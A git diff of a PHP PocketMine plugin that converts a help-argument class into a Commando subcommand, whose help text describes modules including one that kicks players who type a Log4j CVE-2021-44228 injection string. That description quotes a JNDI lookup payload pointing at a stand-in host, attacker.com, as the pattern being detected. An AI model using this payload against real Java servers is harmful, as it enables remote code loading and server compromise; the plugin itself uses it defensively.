@@ -1,13 +1,18 @@
 <?php
 declare(strict_types=1);
 
-namespace LMAO\command\args;
+namespace LMAO\command\subcommand;
 
+use CortexPE\Commando\BaseSubCommand;
 use pocketmine\command\CommandSender;
 
-class HelpArgs extends BaseArgs{
+class HelpCommand extends BaseSubCommand{
 
-	public function handle(CommandSender $sender, array $args) : void{
+	protected function prepare() : void{
+		// TODO: Implement prepare() method.
+	}
+
+	public function onRun(CommandSender $sender, string $aliasUsed, array $args) : void{
 		$sender->sendMessage("Module List:");
 		$sender->sendMessage("/lmao toggle: Toggle troll feature (not use command to execute)");
 		$sender->sendMessage("Log4j CVE-2021-44228: kick player when they chat a thing like <$ {jndi:ldap://attacker.com/reference}>");
